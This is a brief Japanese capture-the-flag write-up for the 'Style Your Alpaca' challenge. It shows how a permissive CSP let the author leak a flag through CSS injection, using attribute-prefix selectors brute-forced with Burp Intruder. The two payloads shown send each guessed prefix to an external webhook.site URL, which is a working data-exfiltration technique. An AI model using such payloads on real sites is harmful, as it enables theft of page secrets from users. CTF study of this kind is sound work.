# Style Your Alpaca

## / Overview

CSSインジェクション

## / Writeup

CSPでCSSのクロスサイトが許可されています。前にCSSインジェクションの記事を見たことがあったので、今回のチャレンジに合うように書き換えて検証しました。

> https://www.mbsd.jp/research/20230403/css-injection/

以下の`§HERE§`に対して BURP で[A-Z]の検証を行いました。IntruderのBattering ram attackを使います。 

```
?artwork=span.flag[data-flag^='§HERE§']{ background: url(https://webhook.site/f11f22dd-ee39-4a2d-985e-17d5f09ffd95?token=§HERE§)}
```

一文字ずつ試していって最終的なペイロードは以下

```
?artwork=span.flag[data-flag^='Alpaca{CUSTOM}']{ background: url(https://webhook.site/f11f22dd-ee39-4a2d-985e-17d5f09ffd95?token=Alpaca{CUSTOM})}
```